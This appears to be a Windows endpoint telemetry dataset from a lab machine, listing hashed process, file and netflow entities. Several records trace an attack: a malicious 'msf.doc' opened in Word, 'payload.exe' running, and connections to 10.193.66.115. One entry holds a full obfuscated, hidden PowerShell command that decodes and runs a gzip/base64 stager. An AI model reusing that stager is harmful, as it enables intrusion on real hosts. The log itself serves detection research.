05817cc165afb04a43f78d87a832caf8b9984f94532d70df35c4a01acea23071,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},447530
651588d2b5b4f5c26b50ecd3cccad3cd870406becbd5deabf605b601b8a1da16,{'subject': 'c:/windows/system32/vssvc.exe C:/Windows/system32/vssvc.exe'},448554
a5f4dd93411ffd78ab0b68edcb361cafe32d6814776418d81cfebed6e8f7deba,{'file': 'c:/windows/microsoft.net/framework/v4.0.30319/mscorsvw.exe'},22574
bb1cbcf3dabfc6f45dc55a2d794b53d83a7d3f011c541736accbd1514364aabd,{'file': 'c:/windows/system32/taskhost.exe'},115770
3e39a2646d868af6f69159979e119dcf8fc321bcdac3c8288cd144487c84e702,{'file': 'c:/windows/system32/api-ms-win-core-synch-l1-2-0.dll'},63
ed01506336b7b1409f3f00e9bf0d45eefd14b3a84b8ee017038abd53216d5ac4,{'file': 'c:/program files/confer/repux.exe'},1097
4e9c2e1b5c0ff46460ada4e4b1c948870a184800c283c086ce201cab3b002dd3,{'file': 'c:/windows/system32/conhost.exe'},115786
168881a605d296449ffd0903185c46dfeb04753a70636b6368cb81454c9b3c0c,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 4907038641940750676-13556288321802227817-821102227248092513632787832-1547897638'},448692
2ed2180dcb54fbace649fd38ae09c2e61a28f72d7d648cc90e07bec61d4cf064,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k swprv'},449100
862c6fe73511ff199613121628f71c7b4f5ac5ba7710feb951d4759adcc08e21,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceNoNetwork'},449101
48202f2584bfd81c999f2c1924e17339bebb83c590747d8f1f0d69a608ea19e8,{'subject': 'c:/program files/windows media player/wmpnscfg.exe C:/Program Files/Windows Media Player/wmpnscfg.exe'},448694
bf8fee6e69b0296126d6b1c993eaf51c61b86bfd3025e50c09078080ec72e9bf,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe '},446965
0fe26a625e23e6ed5e47f5a052c331430a23ef42157a6c324bcc5904c8762977,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceAndNoImpersonation'},447584
6c04df483dd41ba51ed5874ad4c3385f50956ae2415141caf8c967186847128c,{'file': 'c:/users/aalsahee/payload.exe'},425573
1e51f01a6833254f590c7228121e53ab028f654ff6ca2835bac92354adc99988,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},448106
0f7df5ed22afe9972d5eb5a3de57d5984d63fa395aa7db2e4848e27ea91f55a1,{'file': 'c:/windows/sysmon.exe'},85119
a74ed3bd35d4d8d2f4020a476b6fd457fa8f435a5864780a90bb1f31d10d6723,{'file': 'c:/program files/vmware/vmware tools/tpautoconnect.exe'},1154
3ab17882fd561f175248d8358d8b554a7133cd2426144bef4ae9eb53816391ec,{'file': 'c:/users/aalsahee/index.html'},162440
8f213cfe8bd0240528d42f5a4064873ebdb99a923d276aa033562d682ce43b9d,{'subject': 'c:/windows/system32/wermgr.exe C:/Windows/system32/wermgr.exe -queuereporting'},449183
9fc46fecd79f5630f16d281052bd75f52ab90b26abc206c334c7d8e46d74c455,{'file': 'c:/windows/system32/dllhost.exe'},77472
2ac7f3301cec2eef56b8161b4e9c0a69366abbef8056e57e8516a6ffc95fafc5,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},447652
4929eecbab8b6dd2561f834d17ff5a39dadf79e548cb5dd3bcac0622d6f4b281,{'subject': 'c:/program files/vmware/vmware tools/vmtoolsd.exe C:/Program Files/VMware/VMware Tools/vmtoolsd.exe -n vmusr'},448677
a43c914fad5c5d71d9af086bdd88bd7a55e08bffed8bb21239fd348c3c2ffb56,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe '},446632
55370c84a6e31434690b8e98ee96a473357a7683c264db697055c68d4d76a1fa,{'file': 'c:/windows/system32/mmc.exe'},78504
657ffca97dbfd646421df6c711afa754c6de6ef73bade9e2a7f9d6c0d04b0743,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE /n C:/Users/aalsahee/Downloads/m5-2/msf.doc'},447147
397422104f94981cb6549d4eba0cf37a02cce76fbef31cace557d5f625dd1e5c,{'subject': 'c:/windows/system32/searchprotocolhost.exe C:/Windows/system32/SearchProtocolHost.exe Global/UsGthrFltPipeMssGthrPipe5_ Global/UsGthrCtrlFltPipeMssGthrPipe5 1 -2147483646 Software/Microsoft/Windows Search Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot) C:/ProgramData/Microsoft/Search/Data/Temp/usgthrsvc DownLevelDaemon '},448684
0b127e1bb29b804fa74a8debd242ef11270d06ebeeb3d6848525eba5aa438332,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k netsvcs'},446636
a07344102a1a36ba7e7d8b1ea900f826c551fa930dec6c61f0954069c8d1ff4e,"{'subject': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe powershell.exe -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((H4sIAGT61mICA7VWbW/aSBD+Xqn/waqQMCrBNiERRKp0{0}rymsXm{0}sQMUnTb2YjasvcReQ0iv//1mATepkt+71Tqoly+v+dmdnZZ56Z2WUW+5ywWAoeOtfS1/fvpNMzRAmKJLlAkyANylJhbXRKz6uFVVX6JMlzfbNpsQiReHF1ZWRJgmN+/K90MdfTFEd3lOBULkl/Sd4KJ/hscHePfS59lQp/VrqU3SF6EtsbyF9h6UyP+A7F2w3wkHKvYG0q4XPzypVian2mLSvshQzSVi/Y+5TiqBJQWS9K3ktjQ2W+wXDSJn7CULXnFI/F5tTKJU7TEFljbYhPzFQvSIhzl+TAJ5lkSizMJI0cRuQjDYcJ8PQgSnKbFsjQX5ueL{0}R/y/LT3OIs5iXClH3+OcsI2Nky3{0}cVrpoTigeIyXC9CyeULicFEqgdiWrbFciDNKy9J/MSNbeJcj96tK8kslkBrypFSGgL46pcmCjOKjXvENN48UKMFzogGA903gt8y5w+8ggfYM7z{0}P5Mz+sYPBYHrKUHJQ/SWpZMmF3{0}Fmyh9+Ck2S4tPiOt1TYtsq/akvLFUEtGsDE3GUkWDyr/{0}D5Ar6IhMzPadzCS{0}Lj1j5GEfFzpspv{0}QMvKT7AUcnFLHBPLp4WcNDCFIeIC4wFLV6ptSPCv+s2M0IDnOg+{0}DQFryDcpR+dOYZNLvZjE0eA3PEfeFpYQn7gXPqUE/t8d/EPQkWDojQtS8MMEtQvSzZGFEOe63FKTkt6{0}tlhWH{0}218woJz5KeW5uUfoRzdOuBotTnmQ+hBQQcOwN9gmiApCy1CMB+bu5tEua7F9+Ew0CUQuKApS2EA2YEDDYXRElEQd+q2ShUb8360oTgCiUO16FAUQm04JceBVyjEQfFtL/MkODJeoJLD8cJHCLVNGS9LLkk4lB6BcDT4Hw68LjjCEyPBp6jIeV7Nm3suiF9I/d2ToOcJnAMUCQcYOgmLmijFl7VjdZE/KA+My1OGZtno2we6aaP0dvCa8E3LeZ+ayPuQqi0zfSIfdTl0nu3Dn1y3dD64D3LDdGrf+bfW4+M9d6IqM3aym++qjhhrYTjRew5Rw+nKp+qw1VPsaaqSXc8Tto42/Fqtd6vq5+e1wbm6Bu+imoLfWAysiu8cbGEMZHdw0+2lT7dP2tTG+86qdmUd7Sq2zWnostS+nLUVRGgHqXtBAb7KgSjPkjpnT86OmorhmwJ2JZjmTjytbnNP{0}GpfIe0yndl27udfDz21tNQ+WdoNt4Qq00tL0LdebtQsfr3PfbDaffCUPT6WfmfRr68fRy4PiZaazDcdW9R9X61rzXH82WeNvhOKL7mTfbYqN+Ye1rO70bXrp{0}FCsN15lUWQv8YB/34MSAaMKXG801R{0}OTz7pTbVIN2o7WsG6f6H5Ure/uJm1urS8M/6m9s9{0}QNZ8s1{0}o1R6iDr+P6na+JN4+6kGupmRtrifK5me+WjA3Zv7raLNZg8GbbCwZep6Pw5ROB6hVcNDPbcbM9B1LYGJhwy12++2B/PRWD8ZjRpog3121663bEHweBv45G+/A0e5GR7o+0gFfeHW9YzHv89i5WCru+GvYmOLiF9RDWHDcKgfU{0}URpeZ9dzhmTnN3c1sI/d6U5TGIJoK+dXGPuhdq1P7Ipv+djvRMMTRGZw96Z6hoo0+fPgCh5{0}MS8/PqosCsuij1798VNu4LTv+sjZkoSVeIAtehQ+XFpsOSzqnnDBkRGrJ8uLescRJjCr0ebgN5nuqUMl90vEN3gm577IGiJU/6B5/eGpWk74Kl516YT11dzcBLyH2RmZUbHId8VVYfz1UVepj6qNYOaf7rZzPYZi8fjJVFFwRoctv0YBvMka+Uky78fLbjqcCi8P8frZ9DB3msolVC4jzVMANhkjL6E73Cu70{0}4iR2ApsHB5+KSIygC6mf4QSpwcQV4eaUo4G3799LmVIhX8An+jTbPc/+w+ktUUssCnFeTP0686F6/EQAPEQ6SNvQTio+Xm7d{0}OGXKi/hCcCANlqdHXPYH+GT+z4AJ5aGl/A2SeKYBlDAAA)-fx)))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'}",446635
80dca16e53e5153d021df2a298028a85bb75b805f13f7307214ddf926fcfb039,{'file': 'c:/windows/system32/searchprotocolhost.exe'},22702
4c1f450bbd8fb6d5f2236ffb2646b8f11d391e41b0d943f8769184a748fb9814,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceNoNetwork'},447663
2c68a26369bebd867775efddc09478c1a103ff31fabe5474fa9858ee74d320a4,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 84957210495719651927247372-352907007-11692865619976364871770297555-2027919983'},448689
2a12826b3b6c5411ef0a43f5f472e43d60859d93269edca0ca20fc4e21137931,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k NetworkService'},450223
5f66f8139871537b678c86dd70e660e46eedfb19c7a5105209fd1863f7da721f,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/system32/cmd.exe /c C:/Users/aalsahee/Desktop/start_dns_logs.bat '},448691
db652116885820c4ba9b05788a44f4ea3a552242631868cd413e0ebdd678cfb6,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -n -i /Device/NPF_{DE145F66-537B-427D-820A-707CC694DA57} -f udp port 53 -Z 2448'},448687
e9fb7f22530d22ac4c459b5178b3fe0bac66ac96a5b8b06dac07e0133a2006b9,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/System32/cmd.exe '},448693
01fdcc2e5cbe75f88e31297ae4d7cf29be0544c76e403683ea8bdec6b1b62598,{'subject': 'c:/program files/wireshark/tshark.exe C:/Program Files/Wireshark/tshark  -i 2 -t ad -f udp port 53 '},448688
a7cdc7028d8f3446754a1b63d561fa6bde9e4d8599c821bdde05e15ac10da12a,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},450231
f67288a149cd94d920b6f02e21bb97f04ae934f4067b29efa8cb0b3b0919ea4f,{'subject': 'c:/program files/confer/repux.exe C:/Program Files/Confer/RepUx.exe '},450227
02eef3fd3e886ebd094a75fe22b5ad3f0fce9dbe519b18834dc090ac00fcd3a1,{'subject': 'c:/program files/confer/scanner/scanhost.exe scanhost.exe'},450229
dc3c16bf4a6312544d1b2b063abed386aadd0ae7dffe51bda6f4572312d2c3c6,{'subject': 'c:/windows/system32/dwm.exe C:/Windows/system32/Dwm.exe'},450228
d1b3a211ea196051054cc3399158ef035abf2505ffc0e6a6b669c4770f8388b7,{'file': 'c:/program files/windows media player/wmpnscfg.exe'},448695
825efa07c1f89c6cb5225c53f78020bd39ac65537dbca20fb98c414f8196bc53,{'netflow': '192.168.223.128:49225->10.193.66.115:8080'},447670
e2d25c55d94c564e7853d403ee7365f331774634af17a079d2bd3649b05a8740,{'file': 'c:/python27/python.exe'},1207
0765643909551abf4bc032f44ee40a40702fa0435590fb14577ac282ba2aae11,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},447673
f6bdf69bca9d386462267cda26c9a49b04336626f9d49aac965bdbea171383e4,{'subject': 'c:/program files/vmware/vmware tools/vmtoolsd.exe C:/Program Files/VMware/VMware Tools/vmtoolsd.exe'},450235
01ce445211ffe211966b2eb5d5bb3e353a959072ca83ea3d8ed0de1077b0a593,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}'},450238
b87f74efef9f2165f859789ca8ffb93f96fff80cf186787fe0996ac0536cf9c9,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k bthsvcs'},450240
2fc0f091da92fa78b99012e6535eac4da5cd19e3cc06541854526a6f3277b1c9,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 1434882863-1698738339-911213050-525482540-2128358129-10750612361725376888-1018290010'},448709
037c890a0e738a3411e852e6a649226f9280f038a6ee29913b68b30ebb313f28,{'subject': 'c:/windows/microsoft.net/framework/v4.0.30319/mscorsvw.exe C:/Windows/Microsoft.NET/Framework/v4.0.30319/mscorsvw.exe'},447685
95ab7abb84a3eb9a2573a87f28acafc8623ab0ee10b674a7d8156a3746bc6767,{'subject': 'c:/program files/windows media player/wmpnscfg.exe C:/Program Files/Windows Media Player/wmpnscfg.exe'},450247
b9b8a56acdf790eaa244221a40e1396833ff2d480510f5c775ae365cb528967a,{'subject': 'c:/windows/system32/wbem/wmiapsrv.exe C:/Windows/system32/wbem/WmiApSrv.exe'},447178
8eaaada98f7e8cd97f9ed6e3db050728481c0a72093c1f827b79e90471292b40,{'subject': 'c:/windows/system32/wbem/wmiprvse.exe C:/Windows/system32/wbem/wmiprvse.exe -Embedding'},447179
80af06575f295b4dac3ba07d77b8a2b0423793b131d120a3e72eff78b01c53ee,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe -contentproc --channel=3956.5.1336450269/1358069270 -greomni C:/Program Files/Mozilla Firefox/omni.ja -appomni C:/Program Files/Mozilla Firefox/browser/omni.ja -appdir C:/Program Files/Mozilla Firefox/browser  3956 /./pipe/gecko-crash-server-pipe.3956 tab'},447180
4db7cf38425096fdaffc179ffa14e4719339239c9a2c10902b6d07220e582bb4,{'file': 'c:/windows/system32/wbem/wmiprvse.exe'},115917
1d29342da95c3965d342e19152aac405738ee09ab9479ab3232465bbac5135e9,{'subject': 'c:/windows/system32/wbem/wmiprvse.exe C:/Windows/system32/wbem/wmiprvse.exe -secured -Embedding'},447181
9d5ba6a5d82c9d303bd7dd63f108825bf212c14a8d6408f43a3c684aed95eb2b,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k WerSvcGroup'},446671
aa418479f5240e8365ab6d64e93b3af2f8b179720abea8a3edef659bb7dcf84a,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/dllhost.exe /Processid:{D2FE8F47-D0BC-443A-B30F-841E8D5063B0}'},447184
3dccbc49a3abf156b6ccdf6c5476a843dc5e58483c4e3ae4e22afbb3af7df35c,{'subject': 'c:/windows/system32/services.exe C:/Windows/system32/services.exe'},446672
ecf7d53fe0b100f41dadb2963adee2ed8e4ec7b8370e975162f6e554caf0ada8,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k secsvcs'},446674
ab3796744a721542a2193037c7a67e7a1c8ee75fa384dec6f632fbc9cf192dea,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},448722
dae86cd894f3a94d560d8ec905a5253ef2c79029cebc9a0363f5451dfe89aeb5,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/system32/cmd.exe'},446676
5b6cd4b88ec3a121e1d6acae96328db69c1fd590fda164bd8fc11e161b380cba,{'subject': 'c:/windows/sysmon.exe C:/Windows/Sysmon.exe'},446677
2ad79bbfd476b53eb9daaff0e2dd1398971070b7effb184a519d4497880df9ab,{'subject': 'c:/windows/system32/searchprotocolhost.exe C:/Windows/system32/SearchProtocolHost.exe Global/UsGthrFltPipeMssGthrPipe3_ Global/UsGthrCtrlFltPipeMssGthrPipe3 1 -2147483646 Software/Microsoft/Windows Search Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot) C:/ProgramData/Microsoft/Search/Data/Temp/usgthrsvc DownLevelDaemon '},446669
e914b4849b479fe90d237e8da0b4e448556b1101b1b9a5eefd65a07617d7a4d6,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -138432238016802303987292220551944575438-499943003-1228407653718916579-286027110'},446679
4f9a4e715ebd86cb82b735ae6f315ddc0649fe4c419008ed507986f74c28be74,{'subject': 'c:/users/aalsahee/payload.exe payload.exe'},446680
acda2ed98412aae8a69db81e87ab81525e0e36e0a17a623256eccc8327f266fb,{'subject': 'c:/windows/system32/vssvc.exe C:/Windows/system32/vssvc.exe'},447185
185b36a9e05498ceb069e5efb0f9262f2c2a7b585ae8bd5d08b408ec6b5a0453,{'subject': 'c:/windows/system32/searchprotocolhost.exe C:/Windows/system32/SearchProtocolHost.exe Global/UsGthrFltPipeMssGthrPipe4_ Global/UsGthrCtrlFltPipeMssGthrPipe4 1 -2147483646 Software/Microsoft/Windows Search Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot) C:/ProgramData/Microsoft/Search/Data/Temp/usgthrsvc DownLevelDaemon '},446673
10833777d6fbe9f7fc9fb917d2315aa963b07659b845f69f8218e882c9027fe7,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 6364939551866820989-825146777751725726-2068402008-402016816-1063463841-1992284433'},450554
5c4857c626d029fbddbf3dd95ff2b5f1efffd3288b7321a29c3e3e763cbc9667,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceAndNoImpersonation'},450278
29090ee43b130fab78966a8c6379ec9706a00bb74e802e121e32398b149fae23,{'file': 'c:/windows/system32/wbem/wmiapsrv.exe'},115946
3381f2afa05a126263f4670f19285e46dc080106c4b979049735d42514f2daf1,{'subject': 'c:/program files/windows media player/wmpnscfg.exe C:/Program Files/Windows Media Player/wmpnscfg.exe'},450251
0d0aee92c37773ae856d6de38807750cf6376d2f92510668feefccabb0c664e0,{'subject': 'c:/windows/system32/searchprotocolhost.exe C:/Windows/system32/SearchProtocolHost.exe Global/UsGthrFltPipeMssGthrPipe2_ Global/UsGthrCtrlFltPipeMssGthrPipe2 1 -2147483646 Software/Microsoft/Windows Search Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot) C:/ProgramData/Microsoft/Search/Data/Temp/usgthrsvc DownLevelDaemon '},447217
a146e6237c589b8ba535dd6296fcf07bfd3524818bdb4d26875519e9a1c37fbf,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},448758
c4c8156a88cb2182eda2fdbb58a1487550470d40fb8915682444191226329fd0,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},448761
8208b5573196f53f492a967d1f0a3b79f1681b58706bec75e42c372de9eeaf5a,{'subject': 'c:/windows/system32/taskhost.exe taskhost.exe SYSTEM'},450299
54616995da9064f569c081c29f3345e9f2d99ddd3254c41e6d1e4b693d41899b,{'subject': 'c:/program files/vmware/vmware tools/tpautoconnect.exe TPAutoConnect.exe -q -i vmware -a COM1 -F 30'},450300
e3d00f1c5d6019453b4874c546e88be564bfbefd295f115e4ce53693ae64da5d,{'subject': 'c:/windows/system32/wermgr.exe C:/Windows/system32/wermgr.exe -queuereporting'},448764
6759b091c9de4335a5a5b624b288258d17bff28e5901d3c2d46174cd785ffb51,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -411590097-24906590-2101829446-962263901-14784054691240446270-10941475002112876781'},450302
06931b9e4f736deab660a394a00b75ed99f8a83784e098f172ffcf4951cbcf44,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -D -Z none'},450303
aa283fd17e3c9f0ae5ca1419ac985b6a156a128d39d292d01d46f7aafa1c871e,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},448767
52a5ef7fa877e8554b59ab439ed8207ec8c722f3ac0976774cd447058286d150,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 5423614091418514440-1310887696-160524497-17112339341391684519236642845-1949436781'},450304
6624a80757eaeae7ff3fad9e99b452dca97588aca7d31340a1f58c9b5d382bae,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},448768
72d39950243c8b7e311004d8fe55b0aaf32e82c657a247b9ac96c04270fcf0e0,{'subject': 'c:/windows/system32/consent.exe consent.exe 968 378 0136BFF8'},448770
8b71202901e337e2f8a552e6b75dd17b11f00ad9ec3b23937d151a7782cb5bc1,{'file': 'c:/program files/mozilla firefox/firefox.exe'},1284
07084980fc8cbd237da84f931e5fbb00df248357a94c3f685900d22e205b167a,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},448772
fa5a7c6f322c5b7590f9d1bd7aaa6b44f83a779c2f320a1320fce3409a60cdd9,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},448773
cfceb9c915616e3aeb810b3dd5b3f24fd857b1b963684a1f1fdc789de0eac268,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},448774
5916a7489fad11b06afc8bab67ab2504f2f2dfe59632b4f10ebe9fbd5dd492c4,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},447756
db22ccc85971672367c442215b5f1e073a816f43f4bc2a07cee56cb9d50d982c,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k NetworkService'},447757
650e105d404390eec1e11cc22b3cb25b93a8b9ec1dfb1cc32e8fc4bf69403700,{'subject': 'c:/users/aalsahee/payload.exe payload.exe'},446733
36ebe3fe868d992af7104c962a581ee2e90d3a449cb96a9dfd1652b8dc36fc23,{'netflow': '192.168.223.128:49283->10.193.66.115:9999'},446735
ba50d958e51f5966e97ad4b692f714fdaf220b9467fe1d9d5d34f3d293e3d728,{'subject': 'c:/windows/system32/msiexec.exe C:/Windows/system32/msiexec.exe /V'},449293
d14bf11d49c48da7c390661015ae1c196fcc6c690bd870162f111f92abefe861,{'file': 'c:/windows/system32/audiodg.exe'},245523
09c9e7c0fa767c97c0e49b9fdc8e4b86473e3c15dad5b236b8e3cca9a5383590,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -D -Z none'},450334
